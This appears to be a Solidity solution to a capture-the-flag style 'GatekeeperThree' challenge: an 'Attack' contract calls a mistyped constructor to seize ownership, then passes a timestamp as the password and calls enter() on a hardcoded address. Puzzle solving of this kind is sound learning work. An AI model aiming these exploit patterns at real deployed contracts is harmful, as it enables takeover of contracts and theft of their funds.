// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperThree {

    function enter() external ;
    receive() external payable ;
    function createTrick() external;
    function getAllowance(uint256 _password) external ;
    function construct0r() external;

}

contract Attack {
    GatekeeperThree gatekeeper = GatekeeperThree(payable(0xc16d10fFe4E30d1E208C75f1198A464030824987));
    
 function attack() public payable{
        gatekeeper.construct0r();
        gatekeeper.createTrick();
        gatekeeper.getAllowance(block.timestamp);
        gatekeeper.enter();
    }

}